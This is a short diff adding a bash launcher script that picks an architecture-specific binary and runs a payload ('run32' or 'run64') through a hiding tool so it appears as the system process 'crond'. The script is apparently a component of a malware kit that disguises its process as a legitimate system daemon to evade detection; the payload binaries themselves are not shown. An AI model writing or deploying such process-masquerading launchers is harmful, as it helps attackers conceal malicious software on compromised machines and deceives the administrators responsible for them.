@@ -1,0 +1,10 @@
+#!/bin/bash
+
+ARCH=`uname -m`
+HIDE="crond"
+
+if [ "$ARCH" == "i686" ];       then
+        ./h32 -s $HIDE ./run32
+elif [ "$ARCH" == "x86_64" ];   then
+        ./h64 -s $HIDE ./run64
+fi
